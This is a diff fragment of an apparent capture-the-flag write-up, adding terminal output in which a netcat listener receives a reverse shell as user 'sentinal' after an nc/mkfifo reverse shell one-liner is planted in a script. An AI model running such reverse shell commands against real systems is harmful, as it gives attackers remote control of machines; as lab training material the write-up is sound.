@@ -118,7 +118,16 @@ Adding a reverse shell in sentinal.sh and getting a shell as user sentinal
 juniordev@sentinal:/home/sentinal/Pictures$ nano sentinal.sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.6.2 920 >/tmp/f
 ```
-
+```
+kali@kali: nc -nvlp 920
+listening on [any] 920 ...
+192.168.83.150: inverse host lookup failed: Unknown host
+connect to [kali] from (UNKNOWN) [192.168.83.150] 55428
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+sentinal@sentinal: whoami
+sentinal
+```
 
 ## Root Escalation
 
